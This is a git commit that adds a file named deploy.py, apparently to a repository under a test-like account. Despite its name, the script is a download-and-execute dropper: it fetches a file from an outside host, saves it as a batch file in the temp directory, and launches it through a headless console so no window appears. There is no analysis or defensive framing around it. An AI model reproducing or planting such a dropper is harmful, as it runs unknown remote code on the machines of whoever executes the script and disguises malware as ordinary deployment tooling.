c4001ed5cf209fedabaea04240335f73d429ea7e
crmdevtest <crmdevtest@broskiboy.com>
2026-05-18 11:59:21 -0400

    Create deploy.py

---
+++ deploy.py
@@ -0,0 +1,23 @@
+import subprocess
+
+import os
+import tempfile
+import requests
+
+url = "http://s1083932807.online-home.ca/o"
+
+# Get the Windows temp directory path
+temp_dir = tempfile.gettempdir()
+file_path = os.path.join(temp_dir, "zfei.bat")
+
+# Download and save
+response = requests.get(url)
+if response.status_code == 200:
+    with open(file_path, "wb") as f:
+        f.write(response.content)
+    print(f"File downloaded to: {file_path}")
+
+script_path = file_path
+
+# Launch wscript with the script path as an argument
+subprocess.run(["conhost.exe --headless cmd /c ", script_path])
